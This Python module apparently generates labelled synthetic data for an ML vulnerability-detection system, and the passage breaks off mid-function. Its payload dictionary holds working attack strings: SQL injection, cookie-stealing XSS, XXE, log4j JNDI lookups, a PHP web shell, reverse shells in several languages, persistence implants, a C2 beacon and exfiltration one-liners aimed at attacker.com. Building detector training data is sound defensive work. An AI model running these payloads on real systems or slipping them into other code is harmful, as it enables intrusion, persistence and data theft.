"""
Data generator for creating sample vulnerability data.

This module implements functionality to generate synthetic data for training
and testing the zero-day vulnerability detection system.
"""

import logging
import random
import json
import string
import re
from datetime import datetime
from app import db
from models import Payload, Vulnerability
from ml_engine.utils import flatten_dict, get_feature_vector
from ml_engine.feature_extraction import (
    get_json_depth, get_json_breadth, get_json_size, 
    extract_json_keys, extract_json_values,
    calculate_entropy
)

logger = logging.getLogger(__name__)

# Templates for generating different types of payloads
PAYLOAD_TEMPLATES = {
    "sql_injection": [
        "SELECT * FROM users WHERE username='{username}' AND password='{password}'",
        "SELECT * FROM products WHERE category='{category}' ORDER BY name",
        "UPDATE users SET last_login=NOW() WHERE user_id={user_id}",
        "INSERT INTO logs (message, level, timestamp) VALUES ('{message}', '{level}', NOW())"
    ],
    "xss": [
        "<div class='user-content'>{content}</div>",
        "<a href='{url}'>Click here</a>",
        "<img src='{image_url}' alt='{alt_text}'>",
        "<input type='text' value='{default_value}'>"
    ],
    "command_injection": [
        "ping {host}",
        "find {directory} -name {filename}",
        "grep {pattern} {file}",
        "echo {message} > {output_file}"
    ],
    "json": [
        '{"user": {"name": "{name}", "email": "{email}", "role": "{role}"}}',
        '{"product": {"id": {id}, "name": "{name}", "price": {price}}}',
        '{"config": {"debug": {debug}, "timeout": {timeout}, "retries": {retries}}}',
        '{"request": {"method": "{method}", "path": "{path}", "headers": {headers}}}'
    ],
    "xml": [
        '<?xml version="1.0"?><user><name>{name}</name><email>{email}</email></user>',
        '<?xml version="1.0"?><product id="{id}"><name>{name}</name><price>{price}</price></product>',
        '<?xml version="1.0"?><config debug="{debug}"><timeout>{timeout}</timeout><retries>{retries}</retries></config>',
        '<?xml version="1.0"?><request method="{method}"><path>{path}</path><headers>{headers}</headers></request>'
    ]
}

# Malicious payload patterns to inject
MALICIOUS_PATTERNS = {
    "sql_injection": [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' OR username LIKE '%admin%",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
        "WAITFOR DELAY '0:0:10'--",
        "AND (SELECT 9860 FROM (SELECT(SLEEP(5)))OLXk)--",
        "'; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1''')\"'); --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' AND (SELECT 7383 FROM (SELECT COUNT(*), CONCAT(0x7176706b71, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7176706b71, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --"
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "javascript:alert(document.cookie)",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg onload='fetch(\"https://evil.com/\"+document.cookie)'>",
        "<iframe src='javascript:alert(`XSS`)'>",
        "<div onmouseover=\"(function(){try{var s,a,i,j,r,c,l,b=document.createElement('script');b.type='text/javascript';b.src=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,120,115,115,46,106,115);document.getElementsByTagName('head')[0].appendChild(b)}catch(e){}})();\">[Hover for special offer]</div>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><iframe onload='eval(atob(\\\"ZmV0Y2goImh0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2NvbnRlbnQ9IiArIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKTs=\"))'>",
        "<form><button formaction=\"javascript:fetch(`https://attacker.com/exfil?cookies=${document.cookie}`)\">Click me</button></form>",
        "<script>new Image().src=\"https://attacker.com/record?output=\"+document.querySelector(\"input[name=password]\").value;</script>",
        "<noscript><p title=\"</noscript><script>fetch(`https://attacker.com/log?html=${encodeURIComponent(document.documentElement.innerHTML)}`)</script>\">"
    ],
    "command_injection": [
        "; cat /etc/passwd",
        "| ls -la",
        "`id`",
        "$(whoami)",
        "&& wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor",
        "$(curl -s http://attacker.com/rootkit | sudo bash)",
        "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "| python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "& net user administrator backdoor123 /add & net localgroup administrators administrator /add",
        "| timeout 5 ping -c 10 attacker.com # Check for firewall"
    ],
    "xxe": [
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-service/api/v1/keys\"> ]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/shadow\"> ]><data>&file;</data>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\"> %dtd;]><data>&send;</data>",
        "<!DOCTYPE svg [ <!ENTITY % remote SYSTEM \"https://attacker.com/evil.dtd\"> %remote; ]>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\"> %eval; %exfil;]>"
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\system.ini",
        "/var/www/../../etc/shadow",
        "file:///etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "//....//....//....//etc/passwd",
        "../../../Windows/win.ini;.jpg",
        "/proc/self/environ",
        "/var/www/html/development/include.php?path=../../../../../etc/passwd%00"
    ],
    "server_side_template_injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${Runtime.getRuntime().exec('id')}",
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
        "${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')\")}",
        "<%- include('/etc/passwd') %>",
        "{php}system('id');{/php}"
    ],
    "insecure_deserialization": [
        "O:8:\"stdClass\":1:{s:4:\"data\";s:20:\"<script>alert(1)</script>\";}",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADZm9vdAADYmFyeA==",
        "a:2:{i:0;s:4:\"test\";i:1;s:6:\"system\";s:2:\"id\";}",
        "YToxOntzOjQ6InRlc3QiO3M6MTQ6InN5c3RlbSgnaWQnKTsiO30=",
        "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout) { console.log(stdout) });}()\"}"
    ],
    "log4j": [
        "${jndi:ldap://attacker.com/exploit}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}",
        "${jndi:dns://attacker.com/exploit}",
        "${${lower:jndi}:${lower:rmi}://attacker.com/exploit}",
        "${${::-j}ndi:rmi://attacker.com:1099/exploit}"
    ],
    "nosql_injection": [
        "username[$ne]=admin&password[$ne]=",
        "username[$regex]=^adm&password[$ne]=",
        "username[$eq]=admin&password[$regex]=^p",
        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
        "{\"$where\": \"this.username == 'admin' && this.password.match(/^p/)\"}"
    ],
    "prototype_pollution": [
        "{\"__proto__\":{\"isAdmin\":true}}",
        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
        "{\"__proto__\":{\"toString\":\"function() { fetch('https://attacker.com/steal'+document.cookie) }\"}}"
    ],
    "file_upload": [
        "<?php system($_GET['cmd']); ?>",
        "GIF89a1<?php system($_GET['cmd']); ?>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('https://attacker.com/' + document.cookie)\"></svg>",
        "#!/usr/bin/env python\nimport os\nos.system('cat /etc/passwd')"
    ],
    "reverse_shell": [
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"attacker.com\",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"",
        "nc -e /bin/sh attacker.com 4444",
        "rm -f /tmp/p; mknod /tmp/p p && nc attacker.com 4444 0/tmp/p",
        "telnet attacker.com 4444 | /bin/bash | telnet attacker.com 4445"
    ],
    "device_foothold": [
        "function persistentAccess() { (crontab -l 2>/dev/null; echo \"*/5 * * * * curl -s https://attacker.com/payload | bash\") | crontab -; curl -s https://attacker.com/notify?$(hostname)&$(whoami)&$(cat /etc/passwd | base64); }; persistentAccess & disown",
        "powershell.exe -WindowStyle Hidden -Command \"$wc = New-Object System.Net.WebClient; $tempFile = [System.IO.Path]::GetTempFileName(); $tempFile += '.exe'; $wc.DownloadFile('https://attacker.com/backdoor.exe', $tempFile); Start-Process $tempFile; $sysinfo = Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture; $output = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sysinfo | Out-String)); Invoke-WebRequest -Uri ('https://attacker.com/exfil?' + $output) -Method GET; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value $tempFile -PropertyType 'String';\"",
        "import subprocess, requests, os, platform, base64, time; def establish_foothold(): subprocess.Popen('nc -e /bin/bash attacker.com 4444', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); system_info = {'hostname': platform.node(), 'platform': platform.platform(), 'user': os.getlogin(), 'home': os.path.expanduser('~')}; requests.post('https://attacker.com/register', data=base64.b64encode(str(system_info).encode())); with open(os.path.expanduser('~/.bashrc'), 'a') as f: f.write('\\n# Update service\\n(curl -s https://attacker.com/check.sh | bash) &\\n'); establish_foothold()",
        "setTimeout(function() { const systemInfo = {cookies: document.cookie, url: location.href, referrer: document.referrer, userAgent: navigator.userAgent, screenSize: `${screen.width}x${screen.height}`, plugins: Array.from(navigator.plugins).map(p => p.name)}; fetch('https://attacker.com/log', {method: 'POST', body: btoa(JSON.stringify(systemInfo)), keepalive: true}); localStorage.setItem('persistent_id', Date.now()); setInterval(() => fetch('https://attacker.com/beacon?id=' + localStorage.getItem('persistent_id')), 30000); }, 1000);",
        "#!/bin/bash\\nHOST=\"attacker.com\"\\nPORT=443\\nINTERVAL=60\\nwhile true; do\\n  HOSTNAME=$(hostname)\\n  WHOAMI=$(whoami)\\n  IPINFO=$(curl -s http://ipinfo.io/json)\\n  INFO=$(echo \"Host:$HOSTNAME User:$WHOAMI IP:$IPINFO\" | base64)\\n  curl -s --insecure \"https://$HOST:$PORT/c2/$INFO\"\\n  COMMAND=$(curl -s --insecure \"https://$HOST:$PORT/cmd\")\\n  if [ ! -z \"$COMMAND\" ]; then\\n    OUTPUT=$(eval \"$COMMAND\" 2>&1 | base64)\\n    curl -s --insecure -X POST \"https://$HOST:$PORT/result\" -d \"$OUTPUT\"\\n  fi\\n  sleep $INTERVAL\\ndone &",
        "var dns = require('dns'); var net = require('net'); var exec = require('child_process').exec; var os = require('os'); var fs = require('fs'); setInterval(function() { dns.lookup('attacker.com', function(err, address) { if(!err) { var socket = new net.Socket(); socket.connect(8080, address, function() { var hostname = os.hostname(); var platform = os.platform(); var username = os.userInfo().username; socket.write(JSON.stringify({host: hostname, platform: platform, user: username})); exec('cat /etc/passwd', function(err, stdout) { socket.write(stdout); socket.destroy(); }); var startup = os.homedir() + '/.config/autostart/service.desktop'; fs.writeFileSync(startup, '[Desktop Entry]\\nType=Application\\nName=SystemService\\nExec=' + process.execPath + ' ' + __filename + '\\nHidden=false\\nNoDisplay=false\\nX-GNOME-Autostart-enabled=true'); }); }}); }, 3600000);",
        "try { var httpRequest = new ActiveXObject('MSXML2.XMLHTTP'); var shell = new ActiveXObject('WScript.Shell'); var fso = new ActiveXObject('Scripting.FileSystemObject'); var startup = shell.SpecialFolders('Startup'); var payload = startup + '\\\\service.vbs'; httpRequest.open('GET', 'https://attacker.com/payload.txt', false); httpRequest.send(); var code = httpRequest.responseText; fso.CreateTextFile(payload, true).Write(code); var info = 'Computer: ' + shell.ExpandEnvironmentStrings('%COMPUTERNAME%') + ', User: ' + shell.ExpandEnvironmentStrings('%USERNAME%'); httpRequest.open('POST', 'https://attacker.com/register', false); httpRequest.send(info); shell.Run(payload, 0, false); } catch(e) { /* silent fail */ }"
    ],
    "data_exfiltration": [
        "curl -s -X POST -d \"data=$(cat /etc/passwd | base64)\" https://attacker.com/exfil",
        "for file in $(find /home -name \"*.txt\"); do curl -F \"file=@$file\" https://attacker.com/collect; done",
        "powershell -Command \"$files = Get-ChildItem -Path $env:USERPROFILE\\Documents -Filter *.docx -Recurse; foreach ($file in $files) { Invoke-RestMethod -Uri 'https://attacker.com/files' -Method Post -InFile $file.FullName }\"",
        "bitsadmin /transfer exfilJob /download /priority high https://attacker.com/exfil?data=$(findstr /S /I \"password\" C:\\*.txt | base64) nul",
        "SELECT * FROM users INTO OUTFILE '/tmp/users.csv'; scp /tmp/users.csv attacker@attacker.com:/stolen/",
        "(new Image()).src = 'https://attacker.com/pixel.gif?' + encodeURIComponent(document.cookie);",
        "for i in $(ls -la /); do dig $(echo $i | base64).exfil.attacker.com; done",
        "python -c \"import requests; import glob; import base64; files = glob.glob('/etc/ssh/*.pub'); for f in files: data = open(f).read(); requests.post('https://attacker.com/ssh_keys', data={'hostname': open('/etc/hostname').read(), 'key': base64.b64encode(data)})\"",
        "bash -c \"wget -q -O - 'https://attacker.com/x?d='$(find /var/www -name \"wp-config.php\" -exec grep -A 1 DB_PASSWORD {} \\; | base64 -w 0)\"",
        "echo 'BEGIN KEYLOGGER' > /tmp/keys; for i in $(seq 1 1000); do xinput test 3 | grep -o 'key press' --line-buffered | awk '{print $3}' >> /tmp/keys; sleep 0.1; done & curl -X POST -d @/tmp/keys https://attacker.com/keys"
    ]
}

def generate_random_string(length=10):
    """Generate a random alphanumeric string"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_name():
    """Generate a random name"""
    first_names = ["John", "Jane", "Alice", "Bob", "Charlie", "David", "Eva", "Frank", "Grace", "Henry"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_random_email():
    """Generate a random email address"""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "example.com", "company.com"]
    username = generate_random_string(8).lower()
    return f"{username}@{random.choice(domains)}"

def generate_random_ip():
    """Generate a random IP address"""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_normal_payload(payload_type):
    """
    Generate a normal (non-malicious) payload.
    
    Args:
        payload_type (str): Type of payload to generate
        
    Returns:
        str: Generated payload content
    """
    if payload_type not in PAYLOAD_TEMPLATES:
        payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
    
    template = random.choice(PAYLOAD_TEMPLATES[payload_type])
    
    # Replace placeholders with random values
    payload = template
    
    # Common replacements
    replacements = {
        "{username}": generate_random_string(8),
        "{password}": generate_random_string(12),
        "{user_id}": str(random.randint(1, 10000)),
        "{name}": generate_random_name(),
        "{email}": generate_random_email(),
        "{role}": random.choice(["user", "admin", "guest", "editor"]),
        "{id}": str(random.randint(1, 10000)),
        "{price}": str(round(random.uniform(1, 1000), 2)),
        "{content}": "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
        "{url}": f"https://example.com/{generate_random_string(8)}",
        "{image_url}": f"https://example.com/images/{generate_random_string(8)}.jpg",
        "{alt_text}": "Sample image",
        "{default_value}": generate_random_string(8),
        "{host}": generate_random_ip(),
        "{directory}": f"/var/www/{generate_random_string(8)}",
        "{filename}": f"{generate_random_string(8)}.txt",
        "{pattern}": generate_random_string(5),
        "{file}": f"/var/log/{generate_random_string(8)}.log",
        "{message}": f"Log message {generate_random_string(8)}",
        "{output_file}": f"/tmp/{generate_random_string(8)}.txt",
        "{debug}": random.choice(["true", "false"]),
        "{timeout}": str(random.randint(1, 60)),
        "{retries}": str(random.randint(1, 10)),
        "{method}": random.choice(["GET", "POST", "PUT", "DELETE"]),
        "{path}": f"/{generate_random_string(8)}",
        "{headers}": json.dumps({"Content-Type": "application/json", "Authorization": f"Bearer {generate_random_string(32)}"})
    }
    
    for placeholder, value in replacements.items():
        if placeholder in payload:
            payload = payload.replace(placeholder, value)
    
    return payload

def generate_malicious_payload(payload_type):
    """
    Generate a malicious payload with vulnerabilities.
    
    Args:
        payload_type (str): Type of payload to generate
        
    Returns:
        tuple: (payload content, vulnerability details)
    """
    if payload_type not in PAYLOAD_TEMPLATES:
        payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
    
    template = random.choice(PAYLOAD_TEMPLATES[payload_type])
    
    # Generate a normal payload first
    payload = generate_normal_payload(payload_type)
    
    # Choose a vulnerability type to inject
    vuln_type = random.choice(list(MALICIOUS_PATTERNS.keys()))
    
    # Choose a pattern to inject
    pattern = random.choice(MALICIOUS_PATTERNS[vuln_type])
    
    # Inject the vulnerability
    # The approach depends on the vulnerability type
    if vuln_type == "sql_injection":
        # Replace a parameter value with the malicious pattern
        for placeholder in ["{username}", "{password}", "{category}"]:
            if placeholder in template:
                safe_value = payload.split(placeholder.replace("{", "").replace("}", "")+"='")[1].split("'")[0]
                payload = payload.replace(f"'{safe_value}'", f"'{safe_value}{pattern}'")
                break
        vulnerability_name = "SQL Injection"
    
    elif vuln_type == "xss":
        # Inject XSS into content or parameters
        for placeholder in ["{content}", "{alt_text}", "{default_value}"]:
            if placeholder in template:
                safe_value = re.search(placeholder.replace("{", "").replace("}", "")+r"='([^']*)'", payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r'="([^"]*)"', payload)
                if safe_value:
                    safe_value = safe_value.group(1)
                    payload = payload.replace(safe_value, f"{safe_value}{pattern}")
                break
        vulnerability_name = "Cross-Site Scripting (XSS)"
    
    elif vuln_type == "command_injection":
        # Inject command in a parameter
        for placeholder in ["{host}", "{directory}", "{filename}", "{pattern}", "{file}", "{message}"]:
            if placeholder in template:
                safe_value = payload.split(placeholder.replace("{", "").replace("}", "")+" ")[1].split(" ")[0]
                payload = payload.replace(safe_value, f"{safe_value}{pattern}")
                break
        vulnerability_name = "Command Injection"
    
    elif vuln_type == "xxe":
        # Replace XML declaration with XXE payload
        if payload.startswith("<?xml"):
            payload = pattern
        vulnerability_name = "XML External Entity (XXE)"
    
    elif vuln_type == "path_traversal":
        # Replace file/directory paths with traversal
        for placeholder in ["{directory}", "{file}", "{output_file}", "{path}"]:
            if placeholder in template:
                safe_value = re.search(placeholder.replace("{", "").replace("}", "")+r' ([^\s]*)', payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r':([^\s,}]*)', payload)
                if safe_value:
                    safe_value = safe_value.group(1)
                    payload = payload.replace(safe_value, pattern)
                break
        vulnerability_name = "Path Traversal"
    
    elif vuln_type == "server_side_template_injection":
        # Inject template injection in a text field
        for placeholder in ["{content}", "{message}", "{default_value}"]:
            if placeholder in template:
                safe_value = re.search(placeholder.replace("{", "").replace("}", "")+r"='([^']*)'", payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r'="([^"]*)"', payload)
                if safe_value:
                    safe_value = safe_value.group(1)
                    payload = payload.replace(safe_value, f"{safe_value}{pattern}")
                break
        vulnerability_name = "Server-Side Template Injection"
    
    elif vuln_type == "insecure_deserialization":
        # Replace JSON content with malicious serialized object
        if payload_type == "json":
            payload = pattern
        else:
            # Fallback to JSON replacement
            payload = pattern
        vulnerability_name = "Insecure Deserialization"
    
    elif vuln_type == "log4j":
        # Inject Log4j vulnerability in a text field
        for placeholder in ["{content}", "{message}", "{name}", "{email}"]:
            if placeholder in template:
                safe_value = re.search(placeholder.replace("{", "").replace("}", "")+r"='([^']*)'", payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r':"([^"]*)"', payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r'>([^<]*)<', payload)
                if safe_value:
                    safe_value = safe_value.group(1)
                    payload = payload.replace(safe_value, f"{safe_value}{pattern}")
                break
        vulnerability_name = "Log4j Vulnerability"
    
    elif vuln_type == "nosql_injection":
        # Replace JSON content with NoSQL injection
        if payload_type == "json":
            try:
                # Try to parse as JSON and inject NoSQL attack
                json_obj = json.loads(payload)
                # Find a key to inject into
                keys = list(json_obj.keys())
                if keys:
                    key = random.choice(list(keys))
                    if isinstance(json_obj[key], dict):
                        # If the value is a dict, convert it to the pattern
                        json_obj[key] = json.loads(pattern) if pattern.startswith('{') else pattern
                    else:
                        # Otherwise just replace with the pattern
                        json_obj[key] = pattern
                payload = json.dumps(json_obj)
            except json.JSONDecodeError:
                # If not valid JSON, just use the pattern directly
                payload = pattern
        else:
            # For non-JSON payloads, inject into a parameter
            for placeholder in ["{username}", "{password}", "{email}"]:
                if placeholder in template:
                    safe_value = payload.split(placeholder.replace("{", "").replace("}", "")+"='")[1].split("'")[0]
                    payload = payload.replace(f"'{safe_value}'", f"'{pattern}'")
                    break
        vulnerability_name = "NoSQL Injection"
    
    elif vuln_type == "prototype_pollution":
        # Inject prototype pollution into JSON
        if payload_type == "json":
            try:
                # Try to parse as JSON and add prototype pollution
                json_obj = json.loads(payload)
                # Add the pollution object as a property
                pollution_obj = json.loads(pattern) if pattern.startswith('{') else {"__proto__": {"isAdmin": True}}
                json_obj.update(pollution_obj)
                payload = json.dumps(json_obj)
            except json.JSONDecodeError:
                # If not valid JSON, just use the pattern directly
                payload = pattern
        else:
            # For non-JSON payloads, just append the pattern
            payload += "\n" + pattern
        vulnerability_name = "Prototype Pollution"
    
    elif vuln_type == "file_upload":
        # Create malicious file upload content
        payload = pattern
        vulnerability_name = "Malicious File Upload"
    
    else:
        # For any other vulnerability type, just replace a parameter value
        for placeholder in ["{content}", "{message}", "{name}", "{email}", "{username}", "{password}"]:
            if placeholder in template:
                safe_value = re.search(placeholder.replace("{", "").replace("}", "")+r"='([^']*)'", payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r':"([^"]*)"', payload) or \
                            re.search(placeholder.replace("{", "").replace("}", "")+r'>([^<]*)<', payload)
                if safe_value:
                    safe_value = safe_value.group(1)
                    payload = payload.replace(safe_value, f"{safe_value}{pattern}")
                    break
        vulnerability_name = vuln_type.replace("_", " ").title()
    
    # Create vulnerability details
    vulnerability = {
        "name": vulnerability_name,
        "description": f"Injected {vuln_type} vulnerability pattern: {pattern}",
        "severity": random.choice(["medium", "high", "critical"]),
        "confidence": round(random.uniform(0.7, 0.95), 2)
    }
    
    return payload, vulnerability

def generate_sample_data(count=100, save_to_db=True, enhanced=True):
    """
    Generate sample data for training and testing.
    
    Args:
        count (int): Number of samples to generate
        save_to_db (bool): Whether to save the generated data to the database
        enhanced (bool): Whether to use enhanced dataset generation with more diverse examples
        
    Returns:
        dict: Generated samples information
    """
    if enhanced:
        return generate_enhanced_dataset(count, save_to_db)
    
    logger.info(f"Generating {count} sample payloads (basic version)")
    
    # Determine ratio of normal to anomalous samples
    anomalous_count = max(1, int(count * 0.2))  # 20% anomalous
    normal_count = count - anomalous_count
    
    features_list = []
    labels = []
    payloads = []
    
    # Generate normal samples
    for i in range(normal_count):
        payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
        content = generate_normal_payload(payload_type)
        
        if save_to_db:
            # Create a payload entry
            payload = Payload(
                name=f"Normal-{payload_type}-{i}",
                content=content,
                content_type=payload_type if payload_type != "command_injection" else "script",
                size=len(content),
                created_at=datetime.utcnow(),
                analyzed=True,
                anomaly_score=random.uniform(0.0, 0.3),
                is_anomalous=False,
                cluster_id=random.randint(0, 2)  # Assign to one of 3 "normal" clusters
            )
            
            db.session.add(payload)
            db.session.flush()  # Get ID without committing
            
            payloads.append(payload)
        
        # Extract features (simple simulation for speed)
        features = {
            "length": len(content),
            "unique_chars": len(set(content)),
            "has_sql_keywords": "SELECT" in content or "UPDATE" in content,
            "has_script_tags": "<script>" in content,
            "has_suspicious_chars": ";" in content or "|" in content or "'" in content,
            "entropy": random.uniform(3.0, 4.5)  # Typical entropy range for normal text
        }
        
        features_list.append(features)
        labels.append(0)  # 0 for normal
    
    # Generate anomalous samples
    for i in range(anomalous_count):
        payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
        content, vulnerability = generate_malicious_payload(payload_type)
        
        if save_to_db:
            # Create a payload entry
            payload = Payload(
                name=f"Anomalous-{payload_type}-{i}",
                content=content,
                content_type=payload_type if payload_type != "command_injection" else "script",
                size=len(content),
                created_at=datetime.utcnow(),
                analyzed=True,
                anomaly_score=random.uniform(0.7, 1.0),
                is_anomalous=True,
                cluster_id=random.randint(3, 4)  # Assign to one of 2 "anomalous" clusters
            )
            
            db.session.add(payload)
            db.session.flush()  # Get ID without committing
            
            # Create vulnerability entry
            vuln = Vulnerability(
                name=vulnerability["name"],
                description=vulnerability["description"],
                severity=vulnerability["severity"],
                confidence=vulnerability["confidence"],
                payload_id=payload.id
            )
            
            db.session.add(vuln)
            
            payloads.append(payload)
        
        # Extract features (simple simulation for speed)
        features = {
            "length": len(content),
            "unique_chars": len(set(content)),
            "has_sql_keywords": "SELECT" in content or "UPDATE" in content,
            "has_script_tags": "<script>" in content,
            "has_suspicious_chars": ";" in content or "|" in content or "'" in content,
            "entropy": random.uniform(4.5, 7.0)  # Higher entropy for anomalous/malicious content
        }
        
        features_list.append(features)
        labels.append(1)  # 1 for anomalous
    
    if save_to_db:
        # Commit all changes
        try:
            db.session.commit()
            logger.info(f"Successfully saved {count} sample payloads to database")
        except Exception as e:
            db.session.rollback()
            logger.error(f"Error saving sample data to database: {str(e)}")
    
    return {
        "total_count": count,
        "normal_count": normal_count,
        "anomalous_count": anomalous_count,
        "features": features_list,
        "labels": labels,
        "payloads": payloads if save_to_db else []
    }

def generate_enhanced_dataset(count=200, save_to_db=True):
    """
    Generate an enhanced and more diverse dataset for training and testing.
    This function creates a more balanced dataset with examples of all vulnerability types.
    
    Args:
        count (int): Number of samples to generate
        save_to_db (bool): Whether to save the generated data to the database
        
    Returns:
        dict: Generated samples information
    """
    logger.info(f"Generating {count} sample payloads (enhanced version)")
    
    # Determine distribution of samples
    normal_ratio = 0.65  # 65% normal samples
    normal_count = max(1, int(count * normal_ratio))
    anomalous_count = count - normal_count
    
    # Ensure we have at least one sample for each vulnerability type
    vuln_types = list(MALICIOUS_PATTERNS.keys())
    min_vuln_count = len(vuln_types)
    
    if anomalous_count < min_vuln_count:
        # Adjust the counts to ensure minimum coverage
        anomalous_count = min_vuln_count
        normal_count = count - anomalous_count
    
    features_list = []
    labels = []
    payloads = []
    
    # Track vulnerability distribution
    vulnerability_distribution = {vuln_type: 0 for vuln_type in vuln_types}
    
    # Generate normal samples with different payload types
    logger.info(f"Generating {normal_count} normal samples")
    for i in range(normal_count):
        # Distribute normal samples across different payload types
        payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
        content = generate_normal_payload(payload_type)
        
        if save_to_db:
            # Create a payload entry with more granular naming
            payload = Payload(
                name=f"Normal-{payload_type}-{i:04d}",
                content=content,
